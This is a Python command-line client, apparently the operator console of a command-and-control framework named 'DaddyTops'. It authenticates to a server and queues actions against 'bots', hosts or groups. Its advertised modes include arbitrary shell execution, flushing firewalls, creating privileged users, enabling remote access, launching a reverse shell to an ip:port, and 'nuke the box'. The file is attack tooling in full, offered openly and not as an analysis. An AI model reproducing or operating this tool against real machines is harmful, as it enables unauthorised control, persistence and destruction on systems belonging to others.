#!/usr/bin/env python3

import base64
import os
import requests
import json
from prompt_toolkit import prompt
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.completion import WordCompleter
from getpass import getpass
from requests.auth import HTTPBasicAuth
from shutil import get_terminal_size


server = os.environ.get("DT_SERVER", "http://localhost:8888") 
user = os.environ.get("DT_USER", "Unknown")
dtWords = ["action:", "gaction:", "groups", "actions", "show:", "result:", "hosts", "bots", "modes", "help", "exit", "groupmembers"]
dtComp = WordCompleter(dtWords)
print(" =================")
print("| DaddyTops Login |")
print(" =================")
username = input("Username: ")
password = getpass()
try:
    reqauthtok = requests.get(server + "/api/token", auth=HTTPBasicAuth(username, password)).json()
    authtok = reqauthtok['token']
except:
    print("INVALID CREDENTIALS")
    exit()
 

def handleNew(split_inp):
    print(split_inp)
    return


def handleShow(split_inp):
    print(split_inp)
    return


def handleInput(args):
    if args.startswith("action:"):
        newAction(args)
    elif args.startswith("gaction:"):
        newGroupAction(args)
    elif args.startswith("show:"):
        listObj(args)
    elif args.startswith("help"):
        help()
    elif args.startswith("exit"):
        exit()
    elif args == "":
        return
    else:
        print("USAGE ERROR: use `help` for options")
    return


def help():
    print("Daddy Tops Command Line Tool")
    print()
    print("Current Configuration")
    print("Server: " + server)
    print("User: " + user)
    print()
    print("OPTIONS:")
    print("NEW ACTION:              action: <target_hostname>: <action_mode_opcode>: <arguments>")
    print("NEW GROUP ACTION:        gaction: <target_groupname>: <action_mode_opcode>: <arguments>")
    print("SHOW ACTION MODES:       show: modes")
    print("SHOW ACTION RESULT:      show: result: <actionid>")
    print("SHOW TABLE INFO:         show: <table>")
    print("                           -table options: 'bots', 'hosts', 'actions', 'groups', 'groupmembers', 'db'")
    print()
    return


def newAction(args):
    try:
        args = args.split(":", 3)
        target = args[1].strip()
        if target == "help":
            print("USAGE: action: <target_hostname>: <action_mode_opcode>: <arguments>")
            listObj("show: hosts")
            return
        mode = args[2].strip()
        if mode == "help":
            print("USAGE: action: <target_hostname>: <action_mode_opcode>: <arguments>")
            showModes()
            return
        argum = args[3].strip()
        if argum == "help":
            print("USAGE: action: <target_hostname>: <action_mode_opcode>: <arguments>")
            showModes()
            return
    except:
        print("Invalid syntax...")
        return
    opt = ""
    header = {'Content-type': 'application/json'}
    data = {"hostname": target, "mode": mode, "arguments": argum, "options": opt, "dtuser": user}
    request = requests.post(server + "/add/command/single", headers=header, data=json.dumps(data), auth=HTTPBasicAuth(authtok, "garbage"))
    if request.text == "success":
        print("SUCCESS! " + mode + " action queued for host: " + target)
    else:
        print(request.text)
    return


def newGroupAction(args):
    try:
        args = args.split(":", 3)
        target = args[1].strip()
        if target == "help":
            print("USAGE: gaction: <target_groupname>: <action_mode_opcode>: <arguments>")
            listObj("show: groups")
            return
        mode = args[2].strip()
        if mode == "help":
            print("USAGE: gaction: <target_groupname>: <action_mode_opcode>: <arguments>")
            showModes()
            return
        argum = args[3].strip()
        if argum == "help":
            print("USAGE: gaction: <target_groupname>: <action_mode_opcode>: <arguments>")
            showModes()
            return
    except:
        print("Invalid syntax...")
        return
    opt = ""
    header = {'Content-type': 'application/json'}
    data = {"groupname": target, "mode": mode, "arguments": argum, "options": opt, "dtuser": user}
    request = requests.post(server + "/add/command/group", headers=header, data=json.dumps(data), auth=HTTPBasicAuth(authtok, "garbage"))
    if request.text == "success":
        print("SUCCESS! " + mode + " action queued for group: " + target)
    else:
        print(request.text)
    return


def showModes():
    print("  AVAILABLE ACTION MODES:")
    print("  OPCODE   MODE                            Args")
    print("  --------------------------------------------------------")
    print("  1        shell exec                      <shell command>")
    print("  2        firewall flush                  N/A")
    print("  3        create priv. user               N/A")
    print("  4        start/enable remote access      N/A")
    print("  5        start reverse shell             <ip:port>")
    print("  F        nuke the box                    N/A")
    print()
    return


def listObj(args):
    if args == "show: modes":
        showModes()
        return
    try:
        args = args.split(":", 3)
        obj = args[1].strip()
    except:
        print("Invalid syntax...")
        return
    if obj.lower() not in ["bots", "hosts", "actions", "groups", "db", "database", "result", "modes", "groupmembers"]:
        print("Unknown object: " + obj + "...")
        print("Options are (not case-sens): bots, hosts, actions, groups, db, result, modes")
        return
    if "result" not in obj:
        url = server + "/list/" + obj
        request = requests.get(url, auth=HTTPBasicAuth(authtok, "garbage"))
        if request.text == "":
            print("None\n")
            return
        print(request.text)
        return
    else:
        try:
            aid = args[2].strip()
        except:
            print("show: result requires actionid...")
            print("EXAMPLE: `show: result: 45`")
            return
        header = {'Content-type': 'application/json'}
        data = {"actionid": aid}
        request = requests.post(server + "/get/actionresult", headers=header, data=json.dumps(data), auth=HTTPBasicAuth(authtok, "garbage"))
        encRes = request.text
        res = base64.b64decode(encRes).decode("utf-8")
        print(res)
        return


while True:
    user_input = prompt('DT> ', 
                        history=FileHistory('.dt_history'), 
                        auto_suggest=AutoSuggestFromHistory(), 
                        completer=dtComp)
    handleInput(user_input)
